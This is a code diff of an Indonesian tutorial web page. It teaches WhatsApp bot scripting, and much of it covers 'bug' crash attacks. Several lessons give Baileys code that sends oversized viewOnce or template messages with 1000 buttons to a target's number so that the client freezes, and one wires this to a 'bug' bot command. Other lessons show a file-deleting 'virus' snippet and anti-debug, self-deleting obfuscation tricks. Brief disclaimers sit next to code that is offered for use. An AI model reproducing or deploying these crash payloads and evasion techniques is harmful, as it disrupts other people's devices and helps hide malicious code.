@@ -3,106 +3,1323 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>ZalBot AI Chat</title>
-  <script src="https://cdn.tailwindcss.com"></script>
+  <title>Dev Zal Edukasi</title>
   <style>
-    ::-webkit-scrollbar {
-      width: 6px;
-    }
-    ::-webkit-scrollbar-thumb {
-      background: #4b5563;
-      border-radius: 10px;
-    }
-
-    .glow {
-      text-shadow: 0 0 8px #3b82f6, 0 0 20px #3b82f6;
-    }
-
-    .bubble-user {
-      background: linear-gradient(135deg, #2563eb, #1e40af);
-      align-self: flex-end;
+    * { box-sizing: border-box; }
+    html, body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to bottom right, #060b14, #0d1a2f);
       color: white;
+      height: 100%;
     }
-
-    .bubble-bot {
-      background: linear-gradient(135deg, #4b5563, #1f2937);
-      align-self: flex-start;
-      color: white;
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
-
-    .bubble {
-      padding: 0.75rem 1rem;
-      border-radius: 1rem;
-      max-width: 75%;
-      word-wrap: break-word;
-      animation: fadeIn 0.3s ease-in-out;
+    .glass {
+      background: rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(15px);
+      -webkit-backdrop-filter: blur(15px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      box-shadow: 0 0 25px rgba(0, 204, 255, 0.35);
+      border-radius: 14px;
+      padding: 1rem 1.5rem;
+      width: 90%;
+      max-width: 500px;
+      text-align: center;
+      animation: fadeIn 1s ease;
+      max-height: 90vh;
+      overflow-y: auto;
     }
-
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(10px); }
       to { opacity: 1; transform: translateY(0); }
     }
+    input[type="text"] {
+      width: 100%;
+      padding: 6px;
+      margin: 0.5rem 0;
+      border: none;
+      border-radius: 6px;
+      background: rgba(255,255,255,0.1);
+      color: white;
+      font-size: 0.75rem;
+    }
+    button {
+      width: 100%;
+      padding: 6px;
+      border: none;
+      border-radius: 6px;
+      background: linear-gradient(135deg, #00ccff, #007BFF);
+      color: white;
+      font-size: 0.7rem;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 0 10px #00ccff88;
+      transition: all 0.3s ease;
+    }
+    button:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 20px #00ccffcc;
+    }
+    .menu-materi {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 0.4rem;
+      margin-top: 1rem;
+    }
+    .menu-materi button {
+      padding: 6px;
+      font-size: 0.7rem;
+      border-radius: 6px;
+    }
+    #dashboard, #materiPage {
+      display: none;
+    }
+    #kontenMateri {
+      text-align: left;
+      margin-top: 0.8rem;
+      background: rgba(255,255,255,0.05);
+      padding: 0.6rem;
+      border-radius: 6px;
+      font-size: 0.7rem;
+      line-height: 1.4;
+      max-height: 50vh;
+      overflow-y: auto;
+    }
   </style>
 </head>
-<body class="bg-gradient-to-br from-gray-900 via-black to-gray-800 text-white min-h-screen flex items-center justify-center p-4">
-  <div class="bg-gray-900/60 border border-gray-700 p-6 rounded-2xl shadow-2xl w-full max-w-2xl backdrop-blur-md">
-    <h1 class="text-4xl font-bold text-center mb-6 glow">ZalOfficial AI</h1>
-
-    <div class="mb-4">
-      <label for="mode" class="block text-sm mb-1 text-gray-300">🎭 Mode Karakter:</label>
-      <select id="mode" class="w-full p-2 rounded-lg bg-gray-800 border border-gray-700 text-white focus:outline-none focus:ring-2 focus:ring-blue-600 transition">
-        <option value="sopan">Sopan ✨</option>
-        <option value="toxic">Toxic 🔥</option>
-        <option value="receh">Receh 🤡</option>
-        <option value="santuy">Santuy 😎</option>
-      </select>
+<body>
+  
+  <div class="glass" id="loginContainer">
+    <h3 style="text-shadow: 0 0 10px white; font-size: 1rem; margin-bottom: 10px;">Masukkan Nama Kamu</h3>
+    <input id="nama" placeholder="Contoh: Zal Ganteng" style="padding: 10px; width: 80%; border-radius: 8px; border: none; outline: none; font-size: 0.9rem; text-align: center; box-shadow: 0 0 5px rgba(255,255,255,0.5); margin-bottom: 10px;">
+    <br>
+    <button onclick="login()" style="margin-top: 10px; padding: 8px 20px; border-radius: 8px; border: none; background-color: #3498db; color: white; font-weight: bold; cursor: pointer; box-shadow: 0 0 10px #3498db;">
+      Login
+    </button>
+  </div>
+  <div class="glass" id="dashboard">
+    <h3 id="welcomeMsg" style="font-size: 0.9rem;"></h3>
+    <p style="font-size: 0.75rem;">Pilih materi yang ingin kamu pelajari:</p>
+    <div class="menu-materi">
+      <button onclick="showMateri('functionBug')">Function Bug</button>
+      <button onclick="showMateri('scriptWa')">Script WhatsApp</button>
+      <button onclick="showMateri('struktur')">Struktur Project</button>
+      <button onclick="showMateri('scriptTelegram')">Script Telegram</button>
+      <button onclick="showMateri('pasangFunction')">Pasang Function Bug</button>
+      <button onclick="showMateri('handler')">Command Handler Bot</button>
+      <button onclick="showMateri('proteksi')">Lindungi Script</button>
+      <button onclick="showMateri('hosting')">Hosting di VPS</button>
+      <button onclick="showMateri('pterodactyl')">Panel Pterodactyl</button>
+      <button onclick="showMateri('autodeploy')">Auto Deploy Bot</button>
+      <button onclick="showMateri('jsonapi')">JSON & API</button>
+      <button onclick="showMateri('obfuscate')">Obfuscate & Protect</button>
+      <button onclick="showMateri('panelWeb')">Website Panel Sendiri</button>
+      <button onclick="showMateri('uploadVPS')">Upload File ke VPS</button>
+      <button onclick="showMateri('apaItuBug')">Apa Itu Bug WA</button>
+<button onclick="showMateri('caraKerjaBug')">Cara Kerja Bug</button>
+<button onclick="showMateri('jenisBug')">Jenis-Jenis Bug</button>
+<button onclick="showMateri('kenapaTerjadi')">Kenapa Bisa Terjadi</button>
+<button onclick="showMateri('contohPayload')">Contoh Payload</button>
+<button onclick="showMateri('deteksiBug')">Deteksi Bug WA</button>
+<button onclick="showMateri('perlindungan')">Perlindungan dari Bug</button>
+<button onclick="showMateri('etika')">Etika & Legalitas</button>
+<button onclick="showMateri('perbedaanDevice')">Bug Mobile vs Web</button>
+<button onclick="showMateri('efektifitas2025')">Efektivitas di 2025</button>
+<button onclick="showMateri('perbedaanBugVirus')">Perbedaan Bug Dan Virus</button>
+<button onclick="showMateri('macamVirus')">Macam-macam Virus</button>
+<button onclick="showMateri('apaItuVirus')">Apa Itu Virus</button>
+<button onclick="showMateri('strukturCrash')">Struktur WhatsApp Crash</button>
+<button onclick="showMateri('deteksiFile')">Deteksi File Berbahaya</button>
+<button onclick="showMateri('bedabot')">Bot Client vs Baileys</button>
+<button onclick="showMateri('obfuscateExtreme')">Obfuscate Ekstrem</button>
+<button onclick="showMateri('customPayload')">Payload Custom</button>
+<button onclick="showMateri('crashTanpaFile')">Crash Tanpa File</button>
+<button onclick="showMateri('pushInvisible')">Push WA Tanpa Simpan</button>
     </div>
-
-    <div id="chat" class="h-64 overflow-y-auto mb-4 p-3 rounded-xl bg-gray-800 border border-gray-700 flex flex-col space-y-3 text-sm"></div>
-
-    <div class="flex gap-2">
-      <input id="input" class="flex-1 p-2 rounded-lg bg-gray-800 border border-gray-700 text-white focus:ring-2 focus:ring-blue-500 outline-none transition" placeholder="Tulis pesan..." onkeydown="if(event.key === 'Enter') sendMessage()" />
-      <button onclick="sendMessage()" class="bg-blue-600 hover:bg-blue-700 px-5 py-2 rounded-lg text-white transition font-semibold">Kirim</button>
-    </div>
+<div style="text-align: center; margin-top: 30px;">
+  <p style="color: #ccc; font-size: 10px;">
+    Website ini bertujuan untuk belajar tentang seputar hosting
+  </p>
+  <a href="https://wa.me/6289524134626" target="_blank" style="display: inline-block; margin-top: 5px; padding: 5px 10px; background: #007BFF; color: white; border-radius: 5px; text-decoration: none; font-weight: bold;">
+    Hubungi Developer
+  </a>
+</div>
+  <div class="glass" id="materiPage">
+    <h3 id="judulMateri" style="font-size: 0.9rem;"></h3>
+    <div id="kontenMateri"></div>
+    <br>
+    <button onclick="kembaliDashboard()">⬅ Kembali</button>
   </div>
 
   <script>
-    const chatBox = document.getElementById("chat");
-    const input = document.getElementById("input");
-    const mode = document.getElementById("mode");
-
-    function addMessage(sender, text, isBot = false) {
-      const el = document.createElement("div");
-      el.className = `bubble ${isBot ? 'bubble-bot' : 'bubble-user'}`;
-      el.innerHTML = `<span class="block">${text}</span>`;
-      chatBox.appendChild(el);
-      chatBox.scrollTop = chatBox.scrollHeight;
+    function login() {
+      const user = document.getElementById("nama").value.trim();
+      if (!user) {
+        alert("Isi dulu namanya ya!");
+        return;
+      }
+      localStorage.setItem("devUser", user);
+      document.getElementById("loginContainer").style.display = 'none';
+      document.getElementById("dashboard").style.display = 'block';
+      document.getElementById("welcomeMsg").textContent = `Selamat datang, ${user}!`;
     }
 
-    async function sendMessage() {
-      const msg = input.value.trim();
-      if (!msg) return;
+    function showMateri(id) {
+      document.getElementById("dashboard").style.display = 'none';
+      document.getElementById("materiPage").style.display = 'block';
 
-      addMessage("👤", msg, false);
-      input.value = "";
-      input.disabled = true;
+      const judul = document.getElementById("judulMateri");
+      const konten = document.getElementById("kontenMateri");
 
-      try {
-        const res = await fetch("/chat", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ message: msg, mode: mode.value })
-        });
+      const daftarJudul = {
+        functionBug: "Apa Itu Function Bug?",
+        scriptWa: "Cara Buat Script WhatsApp",
+        struktur: "Struktur Project Script",
+        scriptTelegram: "Cara Buat Script Telegram",
+        pasangFunction: "Cara Masang Function Bug",
+        handler: "Command Handler Bot",
+        proteksi: "Cara Lindungi Script dari Bypass/Crack",
+        hosting: "Cara Hosting di VPS",
+        pterodactyl: "Panel Pterodactyl",
+        autodeploy: "Auto Deploy Bot",
+        jsonapi: "JSON & API & Webhook",
+        obfuscate: "Obfuscate & Proteksi File",
+        panelWeb: "Cara Buat Website Panel Sendiri",
+        apaItuBug: "Apa Itu Bug WhatsApp",
+  caraKerjaBug: "Cara Kerja Bug WhatsApp",
+  jenisBug: "Jenis-Jenis Bug WhatsApp",
+  kenapaTerjadi: "Kenapa Bug Bisa Terjadi",
+  contohPayload: "Contoh Payload Bug WA",
+  deteksiBug: "Mendeteksi Bug WhatsApp",
+  perlindungan: "Cara Melindungi Diri dari Bug WA",
+  etika: "Etika & Legalitas Bug",
+  perbedaanDevice: "Bug WA: Mobile vs Web",
+  efektifitas2025: "Apakah Bug WA Masih Efektif di 2025?",
+  macamVirus: "Macam-macam Virus",
+  apaItuVirus: "Apa Itu Virus",
+  strukturCrash: "Struktur yang Membuat WhatsApp Jadi Crash",
+        uploadVPS: "Cara Upload File ke VPS",
+        perbedaanBugVirus: "Perbedaan Bug dan Virus",
+        deteksiFile: "Cara Deteksi File Berbahaya di Script",
+bedabot: "Perbedaan Bot Client vs Baileys",
+obfuscateExtreme: "Teknik Obfuscate Ekstrem + Anti Decode",
+  customPayload: "Cara Buat Payload Custom untuk Crash App Chat",
+  crashTanpaFile: "Teknik Crash WhatsApp Tanpa Kirim File",
+  pushInvisible: "Bot yang Bisa Kirim Pesan Tanpa Disimpan (Push Invisible)"
+      };
 
-        const data = await res.json();
-        addMessage("🤖", data.reply || "Gagal menjawab.", true);
-      } catch (err) {
-        addMessage("🤖", "⚠️ Error koneksi atau server down.", true);
-      } finally {
-        input.disabled = false;
-        input.focus();
+      const daftarKonten = {
+        crashTanpaFile: `<h3>💣 Teknik Crash WhatsApp Tanpa Kirim File</h3>
+<p>Banyak orang mengira crash hanya bisa dilakukan lewat file besar. Nyatanya, kamu bisa menyebabkan lag/crash hanya dengan satu baris pesan.</p>
+
+<h4>🚫 Tanpa Kirim File</h4>
+<ul>
+  <li>Gunakan struktur pesan JSON kompleks.</li>
+  <li>Pakai kombinasi tag HTML atau Unicode rusak.</li>
+  <li>Tambahkan viewOnce dengan nested template panjang.</li>
+</ul>
+
+<h4>📥 Contoh Struktur</h4>
+<pre><code>
+{
+  viewOnceMessage: {
+    message: {
+      extendedTextMessage: {
+        text: "<b><marquee>⚠️ Crash WhatsApp</marquee></b>"
       }
     }
+  }
+}
+</code></pre>
+
+<h4>💡 Kenapa Bisa Crash?</h4>
+<p>Karena WhatsApp mencoba render HTML/Unicode rusak yang tidak dikenali. Parsing gagal, app freeze.</p>
+
+<h4>⚠️ Catatan</h4>
+<p>Fitur ini sering ditambal WhatsApp. Harus selalu eksperimen ulang. Jangan gunakan ke orang lain!</p>`,
+        pushInvisible: `<h3>👻 Bot Kirim Pesan Tanpa Disimpan (Push Invisible)</h3>
+<p>Secara default, WhatsApp tidak menerima pesan dari nomor yang belum disimpan. Tapi dengan teknik tertentu, bot bisa kirim pesan langsung meski tidak saling simpan kontak.</p>
+
+<h4>📲 Teknik Push Invisible</h4>
+<ul>
+  <li>Gunakan nomor bot dengan WhatsApp Business API atau multi-device WA Web.</li>
+  <li>Gunakan ID JID secara langsung, contoh: <code>628xxxx@s.whatsapp.net</code>.</li>
+  <li>Pastikan nomor target tidak memblokir pesan dari siapa pun.</li>
+</ul>
+
+<h4>🛠️ Contoh Kode WA Web</h4>
+<pre><code>
+await sock.sendMessage("628xxxx@s.whatsapp.net", {
+  text: "Hai, ini bot!"
+});
+</code></pre>
+
+<h4>🎯 Kegunaan</h4>
+<ul>
+  <li>Notifikasi otomatis tanpa harus save nomor.</li>
+  <li>Bot alert ke user baru, admin grup, dll.</li>
+</ul>
+
+<h4>⚠️ Peringatan</h4>
+<p>Jangan digunakan untuk spam. WhatsApp akan membatasi atau blokir nomor bot jika dianggap abuse.</p>`,
+        customPayload: `<h3>📦 Cara Buat Payload Custom untuk Crash App Chat</h3>
+<p>Payload custom adalah struktur pesan yang sengaja dirancang untuk membuat aplikasi seperti WhatsApp atau Telegram mengalami error.</p>
+
+<h4>🎯 Tujuan</h4>
+<ul>
+  <li>Testing ketahanan aplikasi.</li>
+  <li>Eksperimen struktur parsing sistem chat.</li>
+</ul>
+
+<h4>🛠️ Contoh Payload Dasar</h4>
+<pre><code>
+const payload = {
+  viewOnceMessage: {
+    message: {
+      templateMessage: {
+        hydratedTemplate: {
+          hydratedContentText: "*💥 CRASH*",
+          hydratedButtons: new Array(1000).fill({
+            quickReplyButton: {
+              displayText: "💣",
+              id: "bug"
+            }
+          })
+        }
+      }
+    }
+  }
+}
+</code></pre>
+
+<h4>🔍 Modifikasi Payload</h4>
+<ul>
+  <li>Tambahkan <strong>struktur JSON berulang</strong>.</li>
+  <li>Tambahkan <strong>emoji rusak</strong> atau simbol aneh di text.</li>
+  <li>Isi dengan <strong>template panjang</strong> atau <code>null</code>.</li>
+</ul>
+
+<h4>⚠️ Peringatan</h4>
+<p>Jangan disalahgunakan. Hanya untuk edukasi dan testing pribadi.</p>`,
+        obfuscateExtreme: `<h3>🛡️ Teknik Obfuscate Ekstrem + Anti Decode</h3>
+<p>Obfuscation adalah proses mengacak kode agar tidak mudah dibaca atau dibongkar. Teknik ini sering digunakan agar script tidak mudah dicrack atau dimodifikasi oleh pihak lain.</p>
+
+<h4>🔍 Tujuan Obfuscation</h4>
+<ul>
+  <li>Melindungi logika dan struktur asli kode.</li>
+  <li>Menghindari pencurian script atau payload.</li>
+  <li>Meningkatkan keamanan dari teknik bypass sederhana.</li>
+</ul>
+
+<h4>🧪 Teknik Obfuscasi Ekstrem</h4>
+<p>Obfuscasi ekstrem biasanya menggunakan kombinasi:</p>
+<ul>
+  <li>Encoding base64 + base32 + hex berlapis-lapis.</li>
+  <li>Pemanggilan fungsi secara dinamis (eval, Function constructor).</li>
+  <li>Pengacak variabel dan fungsi secara acak.</li>
+</ul>
+
+<h4>🛑 Anti Decode Protection</h4>
+<p>Tambahkan juga:</p>
+<ul>
+  <li>Anti-debugger (blok <code>console.log</code>, <code>console.debug</code>).</li>
+  <li>Loop anti-bongkar (fungsi berjalan terus saat terdeteksi buka di devtools).</li>
+  <li>Auto-delete ketika kode terdeteksi dibuka manual.</li>
+</ul>
+
+<h4>⚠️ Catatan</h4>
+<p>Gunakan obfuscation hanya pada bagian penting. Hindari terlalu ekstrem agar tidak merusak performa bot atau script.</p>`,
+        deteksiFile: `<h4>🧠 Apa itu file berbahaya?</h4>
+    <p>File berbahaya dalam script bisa mencuri data, merusak sistem, atau menyembunyikan backdoor. Biasanya ditemukan pada script bajakan atau dari sumber tidak resmi.</p>
+
+    <h4>🔍 Ciri-ciri Umum</h4>
+    <ul>
+      <li><strong>Obfuscated code:</strong> variabel dan fungsi acak seperti <code>_0xabc</code></li>
+      <li><strong>eval(), exec(), Function():</strong> bisa menjalankan kode tersembunyi</li>
+      <li><strong>Akses URL asing:</strong> fetch/download dari server tidak dikenal</li>
+      <li><strong>Auto-run script:</strong> file berjalan otomatis saat dijalankan</li>
+    </ul>
+
+    <h4>🧰 Tips Deteksi</h4>
+    <ul>
+      <li>Gunakan <code>grep</code>, <code>VS Code</code> untuk scan kata kunci berbahaya</li>
+      <li>Upload file ke <a href="https://virustotal.com" target="_blank">VirusTotal</a></li>
+      <li>Jangan pakai script dari sumber tidak dikenal!</li>
+    </ul>`,
+        bedabot: `<h4>🤖 Apa itu Bot Client?</h4>
+    <p>Bot client adalah bot yang berjalan langsung di atas WhatsApp Web API menggunakan browser otomatis (seperti puppeteer, venom.js, dll).</p>
+
+    <h4>📡 Apa itu Bot Baileys?</h4>
+    <p>Baileys adalah library Node.js yang menggunakan WebSocket untuk terhubung ke WhatsApp tanpa browser. Lebih ringan, stabil, dan banyak digunakan oleh developer sekarang.</p>
+
+    <h4>⚖️ Perbandingan</h4>
+    <table border="1" style="font-size: 0.75rem; width: 100%; border-collapse: collapse;">
+      <tr><th style="padding:4px;">Fitur</th><th>Client</th><th>Baileys</th></tr>
+      <tr><td style="padding:4px;">Performa</td><td>Berat</td><td>Ringan</td></tr>
+      <tr><td style="padding:4px;">Stabilitas</td><td>Rentan crash</td><td>Lebih stabil</td></tr>
+      <tr><td style="padding:4px;">Update</td><td>Lambat</td><td>Aktif</td></tr>
+      <tr><td style="padding:4px;">Kontrol</td><td>Terbatas</td><td>Luas (raw API)</td></tr>
+    </table>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Kalau kamu butuh bot yang ringan dan mudah dikembangkan, Baileys lebih disarankan daripada client berbasis browser.</p>`,
+        macamVirus: `<h4>🦠 Virus dalam Konteks Script dan Bot</h4>
+<p>Dalam dunia pengembangan bot atau script, "virus" bukan hanya sekadar malware, tapi mencakup banyak jenis payload atau kode berbahaya yang bisa merusak sistem, mencuri data, atau menyebabkan gangguan serius pada pengguna.</p>
+
+<h4>📂 Jenis-Jenis Virus yang Sering Dijumpai</h4>
+<ul>
+  <li><strong>Keylogger</strong> – Merekam setiap tombol yang ditekan korban.</li>
+  <li><strong>Trojan</strong> – Menyamar sebagai program normal tapi menyisipkan fungsi berbahaya.</li>
+  <li><strong>Worm</strong> – Menyebar otomatis ke perangkat lain tanpa interaksi pengguna.</li>
+  <li><strong>Ransomware</strong> – Mengenkripsi data korban lalu minta tebusan.</li>
+  <li><strong>Botnet Payload</strong> – Mengontrol perangkat korban jadi bagian jaringan bot.</li>
+</ul>
+
+<h4>🚨 Peringatan</h4>
+<p>Script semacam ini <strong>dilarang keras</strong> digunakan untuk hal merugikan. Gunakan hanya untuk pembelajaran, testing di lingkungan sendiri, atau simulasi keamanan.</p>`,
+        apaItuVirus: `<h4>🧬 Definisi Virus Digital</h4>
+<p>Virus adalah program atau potongan kode berbahaya yang dapat mereplikasi dirinya sendiri dan menyebar dari satu perangkat ke perangkat lain. Dalam konteks bot/script, virus bisa berupa file .js, .py, atau binary yang menjalankan fungsi merusak tanpa sepengetahuan user.</p>
+
+<h4>🎯 Tujuan Virus Diciptakan</h4>
+<ul>
+  <li>Mengambil alih sistem</li>
+  <li>Mencuri data (password, token)</li>
+  <li>Merusak atau menghapus file</li>
+  <li>Mengganggu sistem (DoS attack)</li>
+</ul>
+
+<h4>🧪 Contoh Sederhana</h4>
+<pre><code>
+// Contoh 'virus' sederhana di JavaScript
+const fs = require('fs');
+fs.unlinkSync("C:/Users/User/Documents/important.txt");
+</code></pre>
+
+<p>Contoh di atas secara paksa menghapus file penting. Jangan dijalankan di sistem utama!</p>`,
+        strukturCrash: `<h4>📱 Struktur Pesan Berbahaya</h4>
+<p>Aplikasi seperti WhatsApp punya parser untuk menampilkan pesan. Jika struktur pesan rusak atau terlalu berat, client tidak bisa render dengan benar, dan akhirnya crash, lag, atau freeze.</p>
+
+<h4>🧨 Contoh Struktur Crash</h4>
+<pre><code>
+const bugPayload = {
+  viewOnceMessage: {
+    message: {
+      templateMessage: {
+        hydratedTemplate: {
+          hydratedContentText: '*CRASH*',
+          hydratedButtons: Array(1000).fill({
+            quickReplyButton: {
+              displayText: '🔥',
+              id: 'spam'
+            }
+          })
+        }
+      }
+    }
+  }
+};
+</code></pre>
+
+<h4>🛠 Kenapa Ini Bisa Menyebabkan Crash?</h4>
+<ul>
+  <li>Parser WhatsApp terlalu banyak meng-handle elemen UI</li>
+  <li>Payload terlalu besar (melebihi buffer)</li>
+  <li>Format tidak valid, memicu error di dalam aplikasi</li>
+</ul>
+
+<h4>⚠️ Penting!</h4>
+<p>Struktur ini hanya untuk edukasi, uji coba di perangkat sendiri. Jangan disebarkan ke publik atau digunakan untuk serangan!</p>`,
+        perbedaanBugVirus: `<h4>🧠 Pengertian Umum</h4>
+<p><strong>Bug</strong> adalah kesalahan dalam kode atau sistem yang menyebabkan perilaku tak terduga. Sedangkan <strong>virus</strong> adalah program berbahaya yang dirancang untuk merusak, mencuri, atau menyebar tanpa izin.</p>
+
+<h4>🔍 Perbedaan Utama</h4>
+<table style="width:100%; font-size: 0.75rem;">
+  <thead>
+    <tr>
+      <th style="text-align:left;">Aspek</th>
+      <th>Bug</th>
+      <th>Virus</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Tujuan</td>
+      <td>Tidak disengaja / hasil kesalahan coding</td>
+      <td>Disengaja, untuk tujuan merusak atau mencuri</td>
+    </tr>
+    <tr>
+      <td>Cara Kerja</td>
+      <td>Trigger error/crash pada sistem</td>
+      <td>Menginfeksi, menyebar, merusak sistem</td>
+    </tr>
+    <tr>
+      <td>Contoh</td>
+      <td>Pesan crash WhatsApp</td>
+      <td>Ransomware, Keylogger, Worm</td>
+    </tr>
+    <tr>
+      <td>Legalitas</td>
+      <td>Bisa legal (jika digunakan untuk testing)</td>
+      <td>Hampir selalu ilegal</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4>⚠️ Sering Disalahartikan</h4>
+<p>Banyak orang mengira bug itu virus, padahal tidak selalu. Bug bisa jadi jalan masuk untuk virus, tapi bug sendiri tidak berniat merusak secara aktif.</p>
+
+<h4>🛡️ Kesimpulan</h4>
+<p>Bug adalah hasil dari kesalahan, sementara virus adalah hasil dari niat. Keduanya bisa membahayakan, tapi virus punya tujuan jahat. Bug bisa diperbaiki — virus harus dicegah.</p>`,
+        functionBug: `   <h4>🧠 Pengertian</h4>
+    <p>Function bug adalah sebuah fungsi dalam script (biasanya di bot WhatsApp atau Telegram) yang digunakan untuk mengirim struktur pesan tertentu yang dirancang secara sengaja agar membuat aplikasi client crash, lag, freeze, atau bahkan force close.</p>
+
+    <h4>🎯 Tujuan Penggunaan</h4>
+    <ul>
+      <li>Untuk menguji ketahanan aplikasi (testing).</li>
+      <li>Eksperimen struktur parsing pesan.</li>
+      <li>Demonstrasi payload berbahaya (untuk edukasi).</li>
+      <li>Penelitian keamanan sistem chat.</li>
+    </ul>
+
+    <h4>💡 Konsep Dasar</h4>
+    <p>WhatsApp dan Telegram memiliki struktur parsing data tertentu. Jika kamu mengirim data yang malformed (rusak), atau terlalu besar, atau tidak sesuai format JSON mereka, maka client bisa gagal parsing dan crash.</p>
+
+    <h4>📦 Struktur Function Bug</h4>
+    <p>Struktur umum function bug seperti ini:</p>
+    <pre><code>
+// functionBug.js
+async function kirimBug(jid, sock) {
+  const bugPayload = {
+    viewOnceMessage: {
+      message: {
+        templateMessage: {
+          hydratedTemplate: {
+            hydratedContentText: '*⚠️ CRASH PAYLOAD TEST*',
+            hydratedButtons: [
+              {
+                quickReplyButton: {
+                  displayText: '💥 BUG!',
+                  id: 'bug_exploit'
+                }
+              }
+            ]
+          }
+        }
+      }
+    }
+  };
+  await sock.sendMessage(jid, bugPayload);
+}
+module.exports = kirimBug;
+    </code></pre>
+
+    <h4>📁 Struktur Project Direkomendasikan</h4>
+    <pre><code>
+/project/
+├── index.js
+├── bugs/
+│   └── functionBug.js
+├── session/
+├── node_modules/
+└── package.json
+    </code></pre>
+
+    <h4>🔧 Cara Pakai</h4>
+    <p>Di dalam file <code>index.js</code> kamu tinggal panggil function ini saat menerima command:</p>
+    <pre><code>
+const kirimBug = require('./bugs/functionBug');
+
+if (command === 'bug') {
+  await kirimBug(sender, sock);
+}
+    </code></pre>
+
+    <h4>⚠️ Peringatan!</h4>
+    <ul>
+      <li>Jangan gunakan ini untuk menjahili orang secara sengaja.</li>
+      <li>Gunakan hanya untuk testing atau demo keamanan pribadi.</li>
+      <li>WhatsApp bisa update sistem mereka dan bug lama tidak bekerja lagi.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Function bug adalah teknik mengirim struktur pesan abnormal ke aplikasi chat seperti WhatsApp dengan tujuan membuat aplikasi target bermasalah. Gunakan dengan bijak dan hanya untuk edukasi.</p>
+        `,
+        scriptWa: `
+         
+    <h4>📌 Tujuan</h4>
+    <p>Membuat bot WhatsApp yang bisa balas otomatis, deteksi pesan masuk, dan kirim pesan secara realtime, menggunakan library <code>Baileys</code>.</p>
+
+    <h4>📁 Struktur Folder</h4>
+    <pre><code>
+/project-wa/
+├── index.js
+├── package.json
+└── session/
+    </code></pre>
+
+    <h4>🔧 1. Inisialisasi Proyek</h4>
+    <p>Buka terminal Pterodactyl dan jalankan perintah:</p>
+    <pre><code>npm init -y
+npm install @whiskeysockets/baileys</code></pre>
+
+    <h4>📜 2. Isi File <code>index.js</code></h4>
+    <pre><code>
+const { default: makeWASocket, useSingleFileAuthState } = require("@whiskeysockets/baileys");
+const { Boom } = require("@hapi/boom");
+const fs = require("fs");
+
+const { state, saveState } = useSingleFileAuthState('./session/baileys_auth.json');
+
+async function startBot() {
+  const sock = makeWASocket({
+    auth: state,
+    printQRInTerminal: true
+  });
+
+  sock.ev.on("creds.update", saveState);
+
+  sock.ev.on("messages.upsert", async ({ messages }) => {
+    const msg = messages[0];
+    if (!msg.message) return;
+    const from = msg.key.remoteJid;
+    const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
+
+    if (text === "!menu") {
+      await sock.sendMessage(from, { text: "📦 Menu:\n1. !ping\n2. !owner" });
+    } else if (text === "!ping") {
+      await sock.sendMessage(from, { text: "🏓 Pong!" });
+    }
+  });
+}
+
+startBot();
+    </code></pre>
+
+    <h4>📦 3. Jalankan Bot</h4>
+    <p>Di panel Pterodactyl, klik tombol "Start". Scan QR yang muncul lewat WhatsApp Web.</p>
+
+    <h4>🎯 4. Uji Coba</h4>
+    <p>Kirim <code>!menu</code> ke nomor bot kamu. Bot akan membalas otomatis.</p>
+
+    <h4>✅ Selesai</h4>
+    <p>Selamat! Kamu sudah berhasil bikin script WhatsApp pertama kamu menggunakan <code>Baileys</code>. Kamu bisa lanjut buat command modular, tambahkan fitur ban, menu, anti delete, dan lainnya!</p>
+        `,
+        struktur: `
+    <h4>📂 Apa Itu Struktur Project?</h4>
+    <p>Struktur project adalah susunan folder dan file dalam sebuah proyek pemrograman yang dibuat supaya kode terorganisir dengan baik dan mudah dipahami atau dikembangkan.</p>
+
+    <h4>📌 Kenapa Struktur Project Penting?</h4>
+    <ul>
+      <li>Membantu pengelolaan kode yang rapi dan terstruktur.</li>
+      <li>Mudahkan kolaborasi dengan programmer lain.</li>
+      <li>Memudahkan pemeliharaan dan pengembangan kode ke depannya.</li>
+    </ul>
+
+    <h4>🛠️ Contoh Struktur Project Script Bot WhatsApp</h4>
+    <pre><code>
+/project-wa/
+├── commands/        # Folder berisi semua file command
+│   ├── ping.js
+│   ├── bug.js
+│   └── help.js
+├── events/          # Folder untuk event handler (misal onMessage, onCall)
+│   └── message.js
+├── libs/            # Kode library / helper function
+│   └── utils.js
+├── session/         # File sesi login Baileys
+│   └── baileys_auth.json
+├── index.js         # File utama bot berjalan
+├── package.json
+└── README.md
+    </code></pre>
+
+    <h4>🔧 Penjelasan Singkat Tiap Folder / File</h4>
+    <ul>
+      <li><strong>commands/</strong>: Berisi script perintah bot, misal ping, bug, help, dsb.</li>
+      <li><strong>events/</strong>: Tempat handle event WhatsApp, seperti pesan masuk, panggilan, dsb.</li>
+      <li><strong>libs/</strong>: Fungsi tambahan dan utilities.</li>
+      <li><strong>session/</strong>: File sesi login agar bot tidak perlu scan QR berulang.</li>
+      <li><strong>index.js</strong>: Entry point atau titik awal bot berjalan.</li>
+      <li><strong>package.json</strong>: Daftar dependencies dan info proyek Node.js.</li>
+    </ul>
+
+    <h4>✅ Kesimpulan</h4>
+    <p>Struktur project yang rapi dan terorganisir membuat pengembangan bot jadi lebih mudah, cepat, dan minim error. Selalu gunakan struktur yang jelas dan konsisten.</p>
+  `,
+        scriptTelegram: `
+    <h4>📌 Tujuan</h4>
+    <p>Membuat bot Telegram yang bisa balas pesan otomatis, menangani command, dan berinteraksi dengan pengguna menggunakan <code>telegraf</code>, library Telegram Bot API untuk Node.js.</p>
+
+    <h4>📁 Struktur Folder</h4>
+    <pre><code>
+/project-telegram/
+├── commands/
+│   ├── start.js
+│   └── help.js
+├── index.js
+├── package.json
+└── node_modules/
+    </code></pre>
+
+    <h4>🔧 1. Inisialisasi Proyek</h4>
+    <p>Buka terminal VPS atau lokal dan jalankan perintah:</p>
+    <pre><code>npm init -y
